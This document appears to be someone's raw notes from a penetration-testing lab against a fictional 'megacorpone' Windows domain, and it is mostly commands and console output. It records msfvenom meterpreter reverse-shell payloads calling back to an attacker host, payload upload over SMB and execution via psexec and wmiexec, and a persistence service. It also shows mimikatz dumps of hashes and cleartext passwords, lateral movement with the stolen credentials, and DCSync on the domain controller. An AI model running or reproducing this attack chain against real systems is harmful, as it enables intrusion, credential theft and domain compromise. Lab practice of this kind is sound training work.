
Followed https://docs.google.com/document/d/1ATCHPtRRggN_BpnI636oAk_R8h7rOZeBMiFgUhZRCOE/edit?tab=t.0 to setup meterpreter session. And also msfvenom to create exe 

`msf6 exploit(windows/smb/psexec) > msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe -o /tmp/update.exe
[*] exec: msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe -o /tmp/update.exe` 

and uploaded the file using `smbclient `

smbclient //172.22.117.20/Users/tstark -U tstark
Enter tstark's password: <your_password>
smb: \> put /tmp/update.exe update.exe
smb: \> exit

```
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 172.22.117.100:4444
[*] 172.22.117.20:445 - Connecting to the server...
[*] 172.22.117.20:445 - Authenticating to 172.22.117.20:445|megacorpone as user 'tstark'...
[*] 172.22.117.20:445 - Selecting PowerShell target
[*] 172.22.117.20:445 - Executing the payload...
[*] Sending stage (175174 bytes) to 172.22.117.20
[*] Meterpreter session 1 opened (172.22.117.100:4444 -> 172.22.117.20:60159 ) at 2025-04-05 14:25:58 -0400
[+] 172.22.117.20:445 - Service start timed out, OK if running a command or non-service executable...

meterpreter > getuid
Server username: MEGACORPONE\tstark
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.
```

```
meterpreter > migrate 3876
[*] Migrating from 4384 to 3876...
[*] Migration completed successfully.
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : WINDOWS10
SysKey : 1197da08e9ae7a1a84a39e929702036c
Local SID : S-1-5-21-2395882817-3035617120-3953015024

SAMKey : 7b38b15525bc8af8542c06a2785e2780

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 63d33b919a6700bd0e59687549bbf398
    lm  - 0: b02e83190733d488c57a5b2d89356bfa
    ntlm- 0: 63d33b919a6700bd0e59687549bbf398

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a80d398ae46a77a68171eee8bc0ba651

* Primary:Kerberos-Newer-Keys *
    Default Salt : WINDOWS10.MEGACORPONE.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8e8e2835dea83a222f83f5221f1b2a0db5abf43a120af8f3f46e8424a32940c6
      aes128_hmac       (4096) : 37d4645b5aa035ac17c9f85d52973e8e
      des_cbc_md5       (4096) : b5e91c754f896ba4

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WINDOWS10.MEGACORPONE.LOCALAdministrator
    Credentials
      des_cbc_md5       : b5e91c754f896ba4


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 6d4dc02f29be4aaea5c80a54474c1209

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : daac3ff151fe73d58728e574b50ea4e5

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3d9c485b554b6803d89b913cb5630b2f7a8cab2bcda47e1b3cbfac443004a85a
      aes128_hmac       (4096) : 55e5bcdd8d89d7963785f98b2e808a2a
      des_cbc_md5       (4096) : 5b79465d3edcce3e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 5b79465d3edcce3e


RID  : 000003ec (1004)
User : bob
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc
    lm  - 0: 7731b647effec40328c63fc4f3579411
    ntlm- 0: fbdcd5041c96ddbd82224270b57f11fc

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a0e673303f49ca6fea701aae00a18d52

* Primary:Kerberos-Newer-Keys *
    Default Salt : WINDOWS10.MEGACORPONE.LOCALbob
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8c49844ec2df21a4a86a37a7c7d0bd98da252deb153eb9cf9774ace457201be1
      aes128_hmac       (4096) : 4d09f959e2326b82cca97326d1a5dd48
      des_cbc_md5       (4096) : 453e40c74a160b3e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WINDOWS10.MEGACORPONE.LOCALbob
    Credentials
      des_cbc_md5       : 453e40c74a160b3e



meterpreter >
```


```
set SMBUser bbanner
set SMBPass Winter2021
```

---------------------------------
Meterpreter/msfvenom setup
----------------------------------

```
PS C:\Users\azadmin> ssh root@172.30.0.44
root@172.30.0.44's password:
┌──(root💀kali)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe > gems.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes

┌──(root💀kali)-[~]
└─# smbclient //172.22.117.20/C$ -U megacorpone/tstark
Enter MEGACORPONE\tstark's password:
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Fri Apr  4 17:14:45 2025
  $WinREAgent                        DH        0  Tue Oct 19 15:30:59 2021
  bootmgr                          AHSR   413738  Sat Dec  7 04:08:37 2019
  BOOTNXT                           AHS        1  Sat Dec  7 04:08:37 2019
  Documents and Settings          DHSrn        0  Mon May 10 08:16:44 2021
  DumpStack.log.tmp                 AHS     8192  Sun Apr  6 11:54:14 2025
  idle-tracking                       D        0  Thu Feb 27 15:06:05 2025
  pagefile.sys                      AHS 1811939328  Sun Apr  6 11:54:14 2025
  payload.exe                         A    73802  Sat Apr  5 13:47:58 2025
  PerfLogs                            D        0  Sat Dec  7 04:14:16 2019
  Program Files                      DR        0  Thu Feb 27 14:47:57 2025
  Program Files (x86)                DR        0  Thu Nov 19 02:33:53 2020
  ProgramData                       DHn        0  Sat Apr  5 14:15:36 2025
  Recovery                         DHSn        0  Mon May 10 08:16:51 2021
  shell.exe                           A    73802  Sat Apr  5 12:34:33 2025
  swapfile.sys                      AHS 268435456  Sun Apr  6 11:54:14 2025
  System Volume Information         DHS        0  Fri Apr  4 20:06:22 2025
  update.exe                          A    73802  Sat Apr  5 17:06:08 2025
  Users                              DR        0  Mon Jan 17 17:24:45 2022
  Windows                             D        0  Sat Apr  5 19:46:53 2025

                33133914 blocks of size 4096. 26659609 blocks available
smb: \> put gems.exe
putting file gems.exe as \gems.exe (36034.4 kb/s) (average 36036.1 kb/s)
smb: \>




msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 172.22.117.100
LHOST => 172.22.117.100
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.22.117.100   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) >


msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.22.117.100:4444
msf6 exploit(multi/handler) > use scanner/smb/impacket/wmiexec
msf6 auxiliary(scanner/smb/impacket/wmiexec) > options

Module options (auxiliary/scanner/smb/impacket/wmiexec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMAND                     yes       The command to execute
   OUTPUT     true             yes       Get the output of the executed command
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-M
                                         etasploit
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     yes       The password for the specified username
   SMBUser                     yes       The username to authenticate as
   THREADS    1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/impacket/wmiexec) > set SMBUSER tstark
SMBUSER => tstark
msf6 auxiliary(scanner/smb/impacket/wmiexec) > set SMBPASS Password!
SMBPASS => Password!
msf6 auxiliary(scanner/smb/impacket/wmiexec) > set SMBDOMAIN megacorpone
SMBDOMAIN => megacorpone
msf6 auxiliary(scanner/smb/impacket/wmiexec) > set RHOSTS 172.22.117.20
RHOSTS => 172.22.117.20
msf6 auxiliary(scanner/smb/impacket/wmiexec) > set COMMAND c:\gems.exe
COMMAND => c:gems.exe
msf6 auxiliary(scanner/smb/impacket/wmiexec) >

msf6 auxiliary(scanner/smb/impacket/wmiexec) > run

[*] Running for 172.22.117.20...
[*] 172.22.117.20 - SMBv3.0 dialect used
[*] Sending stage (175174 bytes) to 172.22.117.20
[*] Meterpreter session 1 opened (172.22.117.100:4444 -> 172.22.117.20:63443 ) at 2025-04-06 12:05:45 -0400
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/impacket/wmiexec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  1         meterpreter x86/windows  MEGACORPONE\tstark @ WINDOWS10  172.22.117.100:4444 -> 172.22.117.20:63443  (172.22.117
                                                                     .20)

msf6 auxiliary(scanner/smb/impacket/wmiexec) >

msf6 auxiliary(scanner/smb/impacket/wmiexec) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > get
get_timeouts  getenv        getpid        getproxy      getsystem     getwd
getdesktop    getlwd        getprivs      getsid        getuid
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter >

meterpreter > getpid
Current pid: 2828
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 72    4     Registry              x64   0
 368   4     smss.exe              x64   0
 384   624   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 436   624   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 472   460   csrss.exe             x64   0


3528  3560  gems.exe              x86   0        MEGACORPONE\tstark            C:\gems.exe


Pick `svchost.exe` PID

768   632   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe


and migrate our `EXE` to it

768   632   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe



meterpreter > getwd
C:\Windows\system32
meterpreter > shell
Process 4616 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19042.1288]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>sc create TestService binPath= "C:\gems.exe" start=auto
sc create TestService binPath= "C:\gems.exe" start=auto
[SC] CreateService SUCCESS


meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM



meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter >


meterpreter > ?

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the curr


meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username    Domain       NTLM                             SHA1                              DPAPI
--------    ------       ----                             ----                              -----
WINDOWS10$  MEGACORPONE  94fe85636a64a20c2dc50a681cb32e4  93c5e8da8ceae17b745f49b6c6da45a3
                         6                                26a8bd01
bbanner     MEGACORPONE  4c3879fef394fa5dce0037c197c7084  efad9d21e53f8507abf2e52f001645c0  0c14fc59774c25dc12ed6a7b465b344e
                         1                                fb250abc
pparker     MEGACORPONE  57912afe60e9274c35672bf526baed6  d77d83179d12d04f93b2a190959cedea  cdd1ce765bb87589837fdd7814f69fac
                         1                                36733186
tstark      MEGACORPONE  fbdcd5041c96ddbd82224270b57f11f  d9cd5d2605885150dbce1c511f31232b  773598f88cea28e5491780ff7bebf560
                         c                                0f705156

wdigest credentials
===================

Username    Domain       Password
--------    ------       --------
(null)      (null)       (null)
WINDOWS10$  MEGACORPONE  (null)
bbanner     MEGACORPONE  (null)
pparker     MEGACORPONE  (null)
tstark      MEGACORPONE  (null)

kerberos credentials
====================

Username    Domain             Password
--------    ------             --------
(null)      (null)             (null)
WINDOWS10$  megacorpone.local  22 c1 c1 d8 94 53 37 32 b0 c2 9c b6 e7 90 5a 23 eb dd e2 85 ab fe 07 7f 7d 3a d9 88 d6 b3 79
                               61 fb 2a b8 8d 38 30 53 7f 4e 1a d1 ab 44 8c 99 8c 4d 42 01 36 1f b3 0d a3 8a 5a ad 7e f6 5e
                               45 c2 99 3a c4 ff 99 08 59 50 16 46 33 76 2f 78 4a 47 13 5e cd be 47 a8 a9 a4 c8 fe c1 f0 d3
                               fe 86 ba 9a 92 fb ae d2 b2 78 a8 a2 82 1b 7d 30 a2 96 40 4d b0 6c e5 21 e9 00 15 22 3b 29 d1
                               4b 2c 03 be 2b 10 a6 d5 b1 f2 a0 d6 bc c3 a6 a2 41 ee 54 13 11 c5 97 de 1b 70 ef f2 2e b7 73
                               4c 48 f7 75 55 00 ac 4d 99 dd a8 c5 89 38 07 b4 09 13 96 33 52 40 53 42 b6 b2 98 05 ca 7d bb
                               c7 ec f4 21 c6 29 05 21 3a 80 25 4b 8a 4c c3 34 f7 50 6a 26 c8 ec 07 90 dd 19 d4 c9 5b 17 8d
                               07 fd b6 8c 2a 13 4d dd a3 f9 a2 52 08 63 d1 32 8c d5 25 86 7e 69 07
bbanner     MEGACORPONE.LOCAL  Winter2021
pparker     MEGACORPONE.LOCAL  Spring2021
tstark      MEGACORPONE.LOCAL  (null)
windows10$  MEGACORPONE.LOCAL  (null)


meterpreter >



meterpreter > sysinfo
Computer        : WINDOWS10
OS              : Windows 10 (10.0 Build 19042).
Architecture    : x64
System Language : en_US
Domain          : MEGACORPONE
Logged On Users : 9
Meterpreter     : x86/windows



`Lateral Movement` 

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.30.0.44      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/local/wmi) > set RHOSTS 172.22.117.10
RHOSTS => 172.22.117.10
msf6 exploit(windows/local/wmi) > set LHOST 172.22.117.100
LHOST => 172.22.117.100
msf6 exploit(windows/local/wmi) > sessions

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  3         meterpreter x86/windows  MEGACORPONE\tstark @ WINDOWS10  172.22.117.100:4444 -> 172.22.117.20:64401  (172.22.117
                                                                     .20)

msf6 exploit(windows/local/wmi) > set SESSION 3
SESSION => 3
msf6 exploit(windows/local/wmi) > set SMBDOMAIN megacorpone
SMBDOMAIN => megacorpone
msf6 exploit(windows/local/wmi) > set SMBUSER bbanner
SMBUSER => bbanner
msf6 exploit(windows/local/wmi) > set SMBPASS Winter2021
SMBPASS => Winter2021
msf6 exploit(windows/local/wmi) >


Domain Admin

meterpreter > sysinfo
Computer        : WINDC01
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : MEGACORPONE
Logged On Users : 11
Meterpreter     : x86/windows
meterpreter >



meterpreter > shell
Process 1920 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.


C:\Windows\system32>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            bbanner                  cdanvers
Guest                    krbtgt                   pparker
sstrange                 tstark                   wmaximoff
The command completed with one or more errors.


C:\Windows\system32>


C:\Windows\system32>exit
exit
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.
meterpreter > dcsync_ntlm cdanvers
[+] Account   : cdanvers
[+] NTLM Hash : 5ab17a555eb088267f5f2679823dc69d
[+] LM Hash   : cc7ce55233131791c7abd9467e909977
[+] SID       : S-1-5-21-1129708524-1666154534-779541012-1603
[+] RID       : 1603

`From here, we could DCSync every user and put their NTLM hashes in a list in an attempt to crack their passwords.`

```